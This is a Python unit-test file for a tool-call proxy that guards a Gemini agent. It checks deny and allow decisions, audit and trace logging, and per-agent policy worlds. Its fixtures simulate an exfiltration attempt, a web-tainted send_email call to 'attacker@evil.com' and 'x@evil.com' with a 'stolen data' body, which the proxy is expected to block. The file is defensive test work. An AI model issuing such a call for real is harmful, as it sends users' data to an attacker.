"""Unit tests for EPIC 8 issues #93, #94, #95, #96, #97.

Tests GeminiProxy class directly (no httpx / FastAPI required):
- #93: DENY path is logged to audit.jsonl via executor.record_denial()
- #94: SessionManifestBinder routes agent_id to correct world; falls back to restrictive default
- #95: GeminiTraceLogger records all pipeline stages including world_id and session context
- #96: gemini_demo world manifest loads cleanly; send_email is ABSENT
- #97: demo scenario produces correct ABSENT verdict for send_email
"""
import json
import tempfile
import textwrap
import unittest
from pathlib import Path

from safe_mcp_proxy.integrations.gemini_proxy import GeminiProxy
from safe_mcp_proxy.integrations.gemini_trace import GeminiTraceLogger
from safe_mcp_proxy.main import build_executor


_MANIFEST_ALLOW_SEND = textwrap.dedent("""\
    world_id: test_allow
    allowed_tools: [read_file, send_email]
    capabilities:
      read_file: {allowed: true}
      send_email: {allowed: true}
    taint_rules:
      - tainted_external: deny
    side_effects: {external: restricted}
""")

_MANIFEST_DENY_SEND = textwrap.dedent("""\
    world_id: test_deny
    allowed_tools: [read_file]
    capabilities:
      read_file: {allowed: true}
      send_email: {allowed: false}
    taint_rules:
      - tainted_external: deny
    side_effects: {external: restricted}
""")

_POLICY = "simulation:\n  external_side_effects: true\n"


def _make_base_dir(tmp: Path, manifest_text: str) -> Path:
    (tmp / "world_manifest.yaml").write_text(manifest_text, encoding="utf-8")
    cfg = tmp / "safe_mcp_proxy" / "config"
    cfg.mkdir(parents=True)
    (cfg / "policy.yaml").write_text(_POLICY, encoding="utf-8")
    logs = tmp / "safe_mcp_proxy" / "logs"
    logs.mkdir(parents=True)
    (logs / "audit.jsonl").write_text("", encoding="utf-8")
    return tmp


def _web_send_email_request() -> dict:
    return {
        "functionCall": {
            "name": "send_email",
            "args": {"to": "attacker@evil.com", "body": "stolen data"},
        },
        "metadata": {"source_channel": "web"},
    }


def _read_audit(base_dir: Path) -> list[dict]:
    path = base_dir / "safe_mcp_proxy" / "logs" / "audit.jsonl"
    return [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


class TestDenyAuditLogging(unittest.TestCase):
    """Issue #93 — DENY decisions must appear in audit.jsonl."""

    def setUp(self):
        self._tmp = Path(tempfile.mkdtemp())
        _make_base_dir(self._tmp, _MANIFEST_ALLOW_SEND)

    def test_deny_logged_when_tainted_send_email(self):
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor)
        result = proxy.execute(_web_send_email_request())

        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "DENY")
        self.assertEqual(response["rule"], "tainted_external_side_effect")

        entries = _read_audit(self._tmp)
        deny_entries = [e for e in entries if e["decision"] == "DENY"]
        self.assertEqual(len(deny_entries), 1)
        self.assertEqual(deny_entries[0]["tool"], "send_email")
        self.assertEqual(deny_entries[0]["rule"], "tainted_external_side_effect")
        self.assertTrue(deny_entries[0]["taint"])

    def test_allow_still_logged(self):
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor)
        request = {
            "functionCall": {"name": "read_file", "args": {"path": "foo.txt"}},
            "metadata": {"source_channel": "cli"},
        }
        proxy.execute(request)
        entries = _read_audit(self._tmp)
        allow_entries = [e for e in entries if e["decision"] == "ALLOW"]
        self.assertEqual(len(allow_entries), 1)
        self.assertEqual(allow_entries[0]["tool"], "read_file")


class TestGeminiTraceLogger(unittest.TestCase):
    """Issue #95 — all pipeline stages are written to gemini_trace.jsonl."""

    def setUp(self):
        self._tmp = Path(tempfile.mkdtemp())
        _make_base_dir(self._tmp, _MANIFEST_ALLOW_SEND)

    def test_trace_records_all_stages_on_deny(self):
        trace_path = self._tmp / "traces" / "gemini_trace.jsonl"
        logger = GeminiTraceLogger(trace_path)
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor, trace_logger=logger)
        proxy.execute(_web_send_email_request())

        self.assertTrue(trace_path.exists())
        entries = [json.loads(l) for l in trace_path.read_text().splitlines() if l.strip()]
        stages = [e["stage"] for e in entries]
        self.assertIn("request", stages)
        self.assertIn("tool_call", stages)
        self.assertIn("intent", stages)
        self.assertIn("policy", stages)

    def test_trace_entries_have_taint_and_source(self):
        trace_path = self._tmp / "traces" / "gemini_trace.jsonl"
        logger = GeminiTraceLogger(trace_path)
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor, trace_logger=logger)
        proxy.execute(_web_send_email_request())

        entries = [json.loads(l) for l in trace_path.read_text().splitlines() if l.strip()]
        for entry in entries:
            self.assertIn("taint", entry)
            self.assertIn("source_channel", entry)
            self.assertIn("timestamp", entry)
            self.assertTrue(entry["taint"])  # web source is tainted

    def test_no_trace_without_logger(self):
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor)  # no trace_logger
        # Should not raise; trace file is not created
        proxy.execute(_web_send_email_request())

    def test_trace_records_execution_stage_on_allow(self):
        trace_path = self._tmp / "traces" / "gemini_trace.jsonl"
        logger = GeminiTraceLogger(trace_path)
        executor = build_executor(self._tmp)
        proxy = GeminiProxy(executor, trace_logger=logger)
        request = {
            "functionCall": {"name": "read_file", "args": {"path": "foo.txt"}},
            "metadata": {"source_channel": "cli"},
        }
        proxy.execute(request)

        entries = [json.loads(l) for l in trace_path.read_text().splitlines() if l.strip()]
        stages = [e["stage"] for e in entries]
        self.assertIn("execution", stages)


class TestGeminiDemoWorld(unittest.TestCase):
    """Issue #96 — gemini_demo world manifest loads; send_email is ABSENT."""

    def setUp(self):
        self._repo_root = Path(__file__).resolve().parents[1]
        cfg = self._repo_root / "safe_mcp_proxy" / "config"
        policy_path = cfg / "policy.yaml"
        if not policy_path.exists():
            self.skipTest("policy.yaml not found")

    def test_gemini_demo_world_loads(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        self.assertIsNotNone(executor)

    def test_send_email_absent_in_gemini_demo_world(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        proxy = GeminiProxy(executor)
        result = proxy.execute(_web_send_email_request())
        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "ABSENT")
        self.assertEqual(response["rule"], "tool_not_allowlisted")

    def test_read_logs_allowed_in_gemini_demo_world(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        proxy = GeminiProxy(executor)
        request = {
            "functionCall": {"name": "read_logs", "args": {"service": "api"}},
            "metadata": {"source_channel": "cli"},
        }
        result = proxy.execute(request)
        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "ALLOW")

    def test_investigate_incident_allowed_in_gemini_demo_world(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        proxy = GeminiProxy(executor)
        request = {
            "functionCall": {"name": "investigate_incident", "args": {"incident_id": "INC-1"}},
            "metadata": {"source_channel": "cli"},
        }
        result = proxy.execute(request)
        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "ALLOW")

    def test_gemini_demo_tool_surface_excludes_send_email(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        exposed = {t.name for t in executor.registry.list_exposed()}
        self.assertNotIn("send_email", exposed)
        self.assertIn("read_logs", exposed)
        self.assertIn("investigate_incident", exposed)


class TestGeminiDemoScenario(unittest.TestCase):
    """Issue #97 — demo scenario: same prompt, different outcome."""

    def setUp(self):
        self._repo_root = Path(__file__).resolve().parents[1]
        policy_path = self._repo_root / "safe_mcp_proxy" / "config" / "policy.yaml"
        if not policy_path.exists():
            self.skipTest("policy.yaml not found")

    def test_protected_path_absent_not_deny(self):
        """The blocking path must trigger ABSENT (tool_not_allowlisted), not DENY."""
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        proxy = GeminiProxy(executor)
        result = proxy.execute(_web_send_email_request())
        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "ABSENT")
        self.assertNotEqual(response["decision"], "DENY")

    def test_absent_message_is_canonical(self):
        executor = build_executor(self._repo_root, world_id="gemini_demo")
        proxy = GeminiProxy(executor)
        result = proxy.execute(_web_send_email_request())
        response = result["functionResponse"]["response"]
        # Allowlist-miss ABSENT: message is in result["result"]["error"]
        error_text = (response.get("result") or {}).get("error", "")
        self.assertIn("does not exist", error_text)


class TestSessionManifestBinder(unittest.TestCase):
    """Issue #94 — agent_id / session_id → World Manifest binding."""

    def setUp(self):
        self._repo_root = Path(__file__).resolve().parents[1]
        policy_path = self._repo_root / "safe_mcp_proxy" / "config" / "policy.yaml"
        if not policy_path.exists():
            self.skipTest("policy.yaml not found")

    def _make_request(self, agent_id=None, session_id=None) -> dict:
        req = {
            "functionCall": {
                "name": "send_email",
                "args": {"to": "x@evil.com", "body": "stolen"},
            },
            "metadata": {"source_channel": "web"},
        }
        if agent_id is not None:
            req["metadata"]["agent_id"] = agent_id
        if session_id is not None:
            req["metadata"]["session_id"] = session_id
        return req

    def test_explicit_agent_gets_correct_world(self):
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(
            base_dir=self._repo_root,
            agent_manifest_map={"agent-prod": "gemini_demo"},
            default_world_id="read_only",
        )
        from safe_mcp_proxy.integrations.gemini_adapter import GeminiAdapter
        tool_call = GeminiAdapter.parse(self._make_request(agent_id="agent-prod"))
        proxy, world_id = binder.bind(tool_call)

        self.assertEqual(world_id, "gemini_demo")
        # send_email is absent in gemini_demo (not allowlisted)
        result = proxy.execute(self._make_request(agent_id="agent-prod"))
        response = result["functionResponse"]["response"]
        self.assertEqual(response["decision"], "ABSENT")

    def test_missing_agent_id_gets_default_world(self):
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(
            base_dir=self._repo_root,
            agent_manifest_map={"agent-prod": "gemini_demo"},
            default_world_id="read_only",
        )
        from safe_mcp_proxy.integrations.gemini_adapter import GeminiAdapter
        tool_call = GeminiAdapter.parse(self._make_request())  # no agent_id
        _, world_id = binder.bind(tool_call)
        self.assertEqual(world_id, "read_only")

    def test_unknown_agent_id_gets_default_world(self):
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(
            base_dir=self._repo_root,
            agent_manifest_map={"agent-prod": "gemini_demo"},
            default_world_id="read_only",
        )
        from safe_mcp_proxy.integrations.gemini_adapter import GeminiAdapter
        tool_call = GeminiAdapter.parse(self._make_request(agent_id="unknown-agent"))
        _, world_id = binder.bind(tool_call)
        self.assertEqual(world_id, "read_only")

    def test_default_world_is_restrictive(self):
        """Default fallback world (read_only) must not allow external side-effect tools."""
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(base_dir=self._repo_root)
        from safe_mcp_proxy.integrations.gemini_adapter import GeminiAdapter
        tool_call = GeminiAdapter.parse(self._make_request())
        proxy, world_id = binder.bind(tool_call)

        self.assertEqual(world_id, "read_only")
        result = proxy.execute(self._make_request())
        response = result["functionResponse"]["response"]
        # In read_only world, send_email is not allowlisted → ABSENT
        self.assertEqual(response["decision"], "ABSENT")

    def test_executor_cached_per_world(self):
        """Same world_id always returns the same executor instance."""
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(
            base_dir=self._repo_root,
            agent_manifest_map={"a1": "gemini_demo", "a2": "gemini_demo"},
        )
        exec1 = binder.get_executor("gemini_demo")
        exec2 = binder.get_executor("gemini_demo")
        self.assertIs(exec1, exec2)

    def test_trace_includes_world_id_and_agent(self):
        """Trace entries carry world_id and agent_id for full auditability."""
        from safe_mcp_proxy.integrations.session_binder import SessionManifestBinder

        binder = SessionManifestBinder(
            base_dir=self._repo_root,
            agent_manifest_map={"agent-prod": "gemini_demo"},
            default_world_id="read_only",
        )
        tmp_trace = Path(tempfile.mkdtemp()) / "trace.jsonl"
        trace = GeminiTraceLogger(tmp_trace)

        from safe_mcp_proxy.integrations.gemini_adapter import GeminiAdapter
        request = self._make_request(agent_id="agent-prod", session_id="sess-42")
        tool_call = GeminiAdapter.parse(request)
        proxy, _ = binder.bind(tool_call, trace_logger=trace)
        proxy.execute(request)

        entries = [json.loads(l) for l in tmp_trace.read_text().splitlines() if l.strip()]
        first = entries[0]
        self.assertEqual(first["world_id"], "gemini_demo")
        self.assertEqual(first["agent_id"], "agent-prod")
        self.assertEqual(first["session_id"], "sess-42")
